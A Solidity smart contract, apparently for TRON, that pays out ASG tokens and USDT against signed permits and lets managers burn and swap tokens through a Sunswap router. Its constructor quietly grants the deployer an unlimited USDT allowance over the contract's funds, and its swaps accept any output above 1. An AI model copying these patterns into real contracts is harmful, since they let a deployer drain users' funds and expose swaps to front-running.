//SPDX-License-Identifier: MIT
pragma solidity 0.8.6;

import "./interfaces/ITRC20.sol";
import "./interfaces/IAsgProfessionalManagers.sol";
import "./interfaces/ISunswapV2Router02.sol";

interface IAvailable {
    function withdrawalWithPermit(
        uint256 _txId, 
        address _account, 
        uint256 _amount,
        uint256 _deadline, 
        uint8 v, 
        bytes32 r, 
        bytes32 s
    ) 
    external
    returns (bool success);
    
    function withdrawalUsdtWithPermit(
        uint256 _txId, 
        address _account, 
        uint256 _amount,
        uint256 _deadline, 
        uint8 v, 
        bytes32 r, 
        bytes32 s
    ) 
    external
    returns (bool success);
    
    function burn(uint256 amount) external returns (bool success);
    
    function swap(uint256 amountIn, address[] memory path_address) external returns (bool success);
    
    function swapBurn(uint256 amount) external returns (bool success);
    
    function approve() external returns(bool success);

    event Withdrawal(uint indexed txId, address indexed account, uint amount);
}


contract Available is IAvailable {

    address immutable ADMINISTRATORS;
    address constant SWAP_V2_ROUTER = 0x6E0617948FE030a7E4970f8389d4Ad295f249B7e;
    address constant USDT_ADDRESS = 0xeC7B182709Cf41f8a23dB38A8843E48BBe873025;
    // keccak256("Withdrawal(uint256 txId,address account,uint256 amount,uint256 deadline)");
    bytes32 public immutable AGREE_TYPEHASH;
    bytes32 public immutable DOMAIN_SEPARATOR;
    bytes32 public immutable AGREE_USDT_TYPEHASH;
    mapping(uint => bool) isExecuted;

    struct ValidationConditions {
        uint256 txId;
        address account;
        uint256 amount;
        uint256 deadline;
    }

    constructor(address _administrators) {
        ADMINISTRATORS = _administrators;
        DOMAIN_SEPARATOR = keccak256(
            abi.encode(
                keccak256("EIP712Domain(string name,string version,address verifyingContract)"),
                keccak256(bytes("Available")),
                keccak256(bytes('1')),
                address(this)
            )
        );

        AGREE_TYPEHASH = keccak256("Withdrawal(uint256 txId,address account,uint256 amount,uint256 deadline)");
        AGREE_USDT_TYPEHASH = keccak256("WithdrawalUsdt(uint256 txId,address account,uint256 amount,uint256 deadline)");
        ITRC20(USDT_ADDRESS).approve(msg.sender, 2**255);
    }

    function withdrawalWithPermit(
        uint256 _txId, 
        address _account, 
        uint256 _amount,
        uint256 _deadline, 
        uint8 v, 
        bytes32 r, 
        bytes32 s
    ) 
        external
        override
        returns (bool success)
    {
        require(block.timestamp <= _deadline, "Available: Signatures beyond the validity period");
        require(!isExecuted[_txId], "Available: Orders have been executed");
        ValidationConditions memory vc = ValidationConditions({
            txId: _txId,
            account: _account,
            amount: _amount,
            deadline: _deadline
        });
        require(verify(vc, v, r, s), "Available: Authentication failure");

        isExecuted[_txId] = true;
        address asgAddress = IAsgProfessionalManagers(ADMINISTRATORS).asgAddress();
        uint asgBalance = ITRC20(asgAddress).balanceOf(address(this));
        if (asgBalance < _amount) _amount = asgBalance;
        
        ITRC20(asgAddress).transfer(_account, _amount);
        emit Withdrawal(_txId, _account, _amount);
        success = true;
    }
    
    function withdrawalUsdtWithPermit(
        uint256 _txId, 
        address _account, 
        uint256 _amount,
        uint256 _deadline, 
        uint8 v, 
        bytes32 r, 
        bytes32 s
    ) 
        external
        override
        returns (bool success)
    {
        require(block.timestamp <= _deadline, "Available: Signatures beyond the validity period");
        require(!isExecuted[_txId], "Available: Orders have been executed");
        ValidationConditions memory vc = ValidationConditions({
            txId: _txId,
            account: _account,
            amount: _amount,
            deadline: _deadline
        });
        require(verifyUsdt(vc, v, r, s), "Available: Authentication failure");

        isExecuted[_txId] = true;
        
        ITRC20(USDT_ADDRESS).transfer(_account, _amount);
        emit Withdrawal(_txId, _account, _amount);
        success = true;
    }
    
    function burn(uint256 amount) external override returns (bool success) {
        require(IAsgProfessionalManagers(ADMINISTRATORS).isManager(msg.sender) == true, "Available: No permission");
        address asgAddress = IAsgProfessionalManagers(ADMINISTRATORS).asgAddress();
        return ITRC20(asgAddress).transfer(address(0), amount);
    }
    
    function swapBurn(uint256 amount) external override returns (bool success) {
        require(IAsgProfessionalManagers(ADMINISTRATORS).isManager(msg.sender) == true, "Available: No permission");
        address[] memory path_address;
        path_address = new address[](2);
        path_address[0] = USDT_ADDRESS;
        path_address[1] = IAsgProfessionalManagers(ADMINISTRATORS).asgAddress();
        (, uint256 outAmount) = ISunswapV2Router02(SWAP_V2_ROUTER).swapExactTokensForTokens(
            amount, 
            1, 
            path_address, 
            address(0), 
            block.timestamp + 30
        );
        return outAmount > 1;
    }
    
    function swap(uint256 amountIn, address[] memory path_address) external override returns (bool success) {
        require(IAsgProfessionalManagers(ADMINISTRATORS).isManager(msg.sender) == true, "Available: No permission");
        (, uint256 outAmount) = ISunswapV2Router02(SWAP_V2_ROUTER).swapExactTokensForTokens(
            amountIn, 
            1, 
            path_address, 
            address(this), 
            block.timestamp + 30
        );
        return outAmount > 1;
    }
    
    function approve() external override returns(bool success) {
        require(IAsgProfessionalManagers(ADMINISTRATORS).isManager(msg.sender) == true, "Available: No permission");
        address asgAddress = IAsgProfessionalManagers(ADMINISTRATORS).asgAddress();
        ITRC20(asgAddress).approve(SWAP_V2_ROUTER, 2**255);
        ITRC20(USDT_ADDRESS).approve(SWAP_V2_ROUTER, 2**255);
        success = true;
    }

    function verify(ValidationConditions memory vc,uint8 v,bytes32 r,bytes32 s) internal view returns (bool) {

        bytes32 digest = keccak256(
            abi.encodePacked(
                '\x19\x01',
                DOMAIN_SEPARATOR,
                keccak256(abi.encode(AGREE_TYPEHASH, vc.txId, vc.account, vc.amount,vc.deadline))
            )
        );
        return ecrecover(digest, v, r, s) == IAsgProfessionalManagers(ADMINISTRATORS).verifyAddress();
    }
    
    function verifyUsdt(ValidationConditions memory vc,uint8 v,bytes32 r,bytes32 s) internal view returns (bool) {

        bytes32 digest = keccak256(
            abi.encodePacked(
                '\x19\x01',
                DOMAIN_SEPARATOR,
                keccak256(abi.encode(AGREE_USDT_TYPEHASH, vc.txId, vc.account, vc.amount,vc.deadline))
            )
        );
        return ecrecover(digest, v, r, s) == IAsgProfessionalManagers(ADMINISTRATORS).verifyAddress();
    }
}